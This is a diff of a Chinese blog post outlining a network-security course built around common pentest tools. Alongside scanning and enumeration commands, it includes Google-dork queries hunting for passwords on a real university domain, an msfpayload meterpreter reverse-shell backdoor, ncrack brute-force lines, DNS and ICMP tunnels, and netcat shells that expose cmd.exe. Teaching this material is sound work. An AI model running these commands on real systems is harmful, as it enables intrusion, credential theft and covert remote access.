@@ -3,13 +3,7 @@ author: wangguohao
 comments: true
 date: 2015-01-01 12:23:00+00:00
 layout: post
-slug: '%e5%ae%89%e5%85%a8%e8%af%be%e7%a8%8b%e7%9a%84%e5%a4%87%e8%af%be'
 title: 安全课程的备课
-wordpress_id: 575
-categories:
-- 计算机
-tags:
-- 安全
 ---
 
 The first course will end with a video，准备最后一段课程的视频的录制，课程的设计的思路是：借助一下主流的工具，来介绍一下常见的网络安全的比较感性的原理（对细微本身讲的较少）。大体课程内容设计如下：
@@ -27,7 +21,8 @@ From the creators of BackTrack comes Kali Linux, the most advanced and versatile
 Backbox Linux:
 Another Ubuntu based distro but uses XFCE as its window manager and relies on its own repo to constantly keep its tools updated.
 
-Pentoo: A livecd based on Gentoo and XFCE. Also available as an overlay for existing Gentoo installations. Has the ability to crack passwords using GPGPU out of the box.
+Pentoo:
+A livecd based on Gentoo and XFCE. Also available as an overlay for existing Gentoo installations. Has the ability to crack passwords using GPGPU out of the box.
 
 目的是介绍主要的工具集。
 
@@ -42,28 +37,33 @@ Pentoo: A livecd based on Gentoo and XFCE. Also available as an overlay for exis
     dnsmap cisco.com -w wordlist.txt -c cisco.csv
 
 路由信息收集工具，一个传统的udp实现，一个现代一点的利用tcp实现，可以穿越防火墙。
-paratrace,一种新的、隐形的 traceroute,可使用有状态的过滤器。
-traceroute:传统的工具
-tcptraceroute ：稍微新一点，利用tcp的工具。
 
-搜索引擎的技巧 http://en.wikipedia.org/wiki/Google_hacking
-filetype:xls site:jlxy.nju.edu.cn
-密码 site:jlxy.nju.edu.cn
-密码 site:jlxy.nju.edu.cn filetype:doc
-site:jlxy.nju.edu.cn intext:admin
+    paratrace,一种新的、隐形的 traceroute,可使用有状态的过滤器。
+    traceroute:传统的工具
+    tcptraceroute ：稍微新一点，利用tcp的工具。
+
+搜索引擎的技巧
+
+    http://en.wikipedia.org/wiki/Google_hacking
+    filetype:xls site:jlxy.nju.edu.cn
+    密码 site:jlxy.nju.edu.cn
+    密码 site:jlxy.nju.edu.cn filetype:doc
+    site:jlxy.nju.edu.cn intext:admin
 
 自动化，综合的信息收集平台maltego
-1：domain
-2：dns
-3：whois information
-4：network block
-5：ip address
-6：E-mail
+
+    1：domain
+    2：dns
+    3：whois information
+    4：network block
+    5：ip address
+    6：E-mail
 
 
 ### 扫描技术
 
 发现主机
+
     arping -c 2 192.168.1.1
 
     fping -s -r 1 192.168.1.1 192.168.1.254
@@ -77,16 +77,17 @@ site:jlxy.nju.edu.cn intext:admin
 
 操作系统指纹识别
 
-主动：nmap -O
+    主动：nmap -O
 
-被动：p0f
+    被动：p0f
 
 端口扫描
-autoscan
 
-netifera
+    autoscan
 
-scanrand:一个非常快速、无状态的 TCP 端口扫描器和 traceroute 工具
+    netifera
+
+    scanrand:一个非常快速、无状态的 TCP 端口扫描器和 traceroute 工具
 
 服务探测
 
@@ -98,9 +99,6 @@ VPN探测
     ike-scan -M -v 192.168.1.1
 
     sslscan 192.168.1.1
-
-
-
 
 ### 漏洞发现
 
@@ -157,7 +155,6 @@ W3af
 ### 集成化的工具包
 MSF
 
-
     msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.150 LPORT=4444 X > backdoor.exe
 
     msfconsole
@@ -171,23 +168,26 @@ MSF
 
 
 ####Layer 2:
-CDP(cisco discovery protocols)
-mac flood
+
+    CDP(cisco discovery protocols)
+    mac flood
 
 ####Layer 3:
 dhcp
 tcp syn flood
 
 结合一点点嗅探技术：
-dsniff 包由 Dug Song 编写,已经发布几年了,是一组强大的网络审核工具。其中有一个简洁的小工具 arpspoof,可用于向 ARP 缓存注入虚假信息。该工具可以创建 Gratuitous ARP 应答,应答数据包中的源 IP 是用户打算伪装的 IP 地址,而目标 IP 则是所要嗅探的目标计算机。
+
+    dsniff 包由 Dug Song 编写,已经发布几年了,是一组强大的网络审核工具。其中有一个简洁的小工具 arpspoof,可用于向 ARP 缓存注入虚假信息。该工具可以创建 Gratuitous ARP 应答,应答数据包中的源 IP 是用户打算伪装的 IP 地址,而目标 IP 则是所要嗅探的目标计算机。
 
 
 ### 密码破解
 
 
 ####在线的：以破解cisco的路由器，和html表单的例子。
-ncrack -U pass -v -P pass telnet://192.168.1.1
-ncrack -U pass -v -P pass http://192.168.1.1
+
+    ncrack -U pass -v -P pass telnet://192.168.1.1
+    ncrack -U pass -v -P pass http://192.168.1.1
 
 ####Web 表单
 
@@ -198,10 +198,13 @@ ncrack -U pass -v -P pass http://192.168.1.1
 基本都是两台主机，其中一台替另一台通过某些服务对流量进行封装中继。
 
 ####Dns 隧道
+
 Server:dns2tcpd
+
     ./dns2tcpd -F -d 1 -f dns2tcpd.conf
 
 Client:
+
     ./dns2tcpc  -z  domain.org
 
 
@@ -215,20 +218,25 @@ Client:
 
 ####icmp 隧道
 Server:
+
     ./ptunnel
 
 Client:
+
     ./ptunnel -p tun.ser_ip -lp 2222 -da ture.ip  -dp 22
 
 ####代理服务器
 netcat
 Windows:
+
     nc.exe -d -L -p 1234 -e cmd.exe
 
 Remote:
+
     nc -l -p 1234
 
 locale:
+
     nc -d remore port -e cmd.exe
 
 Nc realy:（利用脚本实现），就是一种重定向，指定的数据流转发，还可以把传输的信息dump一次。
